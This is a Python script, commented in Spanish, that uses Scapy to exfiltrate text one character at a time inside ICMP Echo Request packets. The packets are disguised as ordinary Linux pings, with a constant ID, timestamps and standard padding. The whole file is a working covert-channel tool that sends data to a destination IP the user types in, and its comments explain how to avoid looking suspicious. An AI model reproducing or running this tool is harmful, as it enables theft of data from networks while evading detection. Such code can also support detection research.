import time
import struct
import random
from scapy.all import IP, ICMP, sr1, Raw


def exfiltrar_texto_icmp(destino, texto):
    """
    Envía un texto de forma encubierta, carácter por carácter, dentro de paquetes
    ICMP Echo Request que emulan ser un ping estándar de Linux.

    Args:
        destino (str): La dirección IP del destinatario.
        texto (str): El texto que se va a exfiltrar.
    """
    # 2. Se genera un único ID de ICMP para toda la sesión.
    #    Esto simula el ID de proceso que usaría un ping normal,
    #    haciendo que todos los paquetes parezcan parte de la misma ejecución.
    icmp_id = random.randint(0, 65535)
    print(f"[*] Iniciando exfiltración hacia {destino} con ICMP ID: {icmp_id}")

    # Iteramos sobre el texto, obteniendo tanto el índice (para el seq) como el carácter.
    for i, caracter in enumerate(texto, start=1):

        # --- Construcción del Payload Sigiloso (48 bytes) ---

        # 4. Los primeros 8 bytes son un timestamp.
        #    Usamos 'struct.pack' con el formato 'd' (double, 8 bytes) para empaquetar
        #    la hora actual en formato binario, tal como lo haría un ping estándar.
        timestamp = struct.pack('d', time.time())

        # 4. Los 40 bytes restantes son un patrón de relleno estándar.
        #    Creamos un objeto 'bytearray' mutable con una secuencia de bytes
        #    típica (0x10, 0x11, 0x12, etc.) para que el payload no parezca sospechoso.
        padding = bytearray(range(0x10, 0x10 + 40))

        # 5. Inyectamos nuestro carácter secreto en el noveno byte.
        #    Reemplazamos el primer byte del patrón de relleno (índice 0, que es
        #    el noveno byte del payload total) con el valor ASCII de nuestro carácter.
        padding[0] = ord(caracter)

        # Unimos el timestamp y el relleno modificado para formar el payload final.
        payload_final = timestamp + bytes(padding)

        # --- Construcción y Envío del Paquete ---

        # Se ensambla el paquete con Scapy:
        # - IP: Capa de red con el destino especificado.
        # - ICMP: Usamos el ID de sesión constante y el número de secuencia incremental.
        # - Raw: Adjuntamos nuestro payload cuidadosamente construido.
        paquete = IP(dst=destino) / ICMP(id=icmp_id, seq=i) / \
            Raw(load=payload_final)

        print(f"[*] Enviando caracter '{caracter}' (seq={i})...")

        # Enviamos el paquete y esperamos una respuesta (sr1).
        # El 'timeout' evita que el script se quede esperando indefinidamente.
        sr1(paquete, timeout=2, verbose=0)

    print(f"\n[+] Exfiltración completada. Se enviaron {len(texto)} paquetes.")


# --- Bloque principal de ejecución ---
if __name__ == "__main__":
    # 1. Solicitamos al usuario la IP de destino y el texto.
    ip_destino = input("Ingrese la dirección IP de destino: ")
    texto_a_enviar = input("Ingrese el texto a exfiltrar: ")

    if ip_destino and texto_a_enviar:
        exfiltrar_texto_icmp(ip_destino, texto_a_enviar)
    else:
        print("[!] Error: La IP de destino y el texto no pueden estar vacíos.")
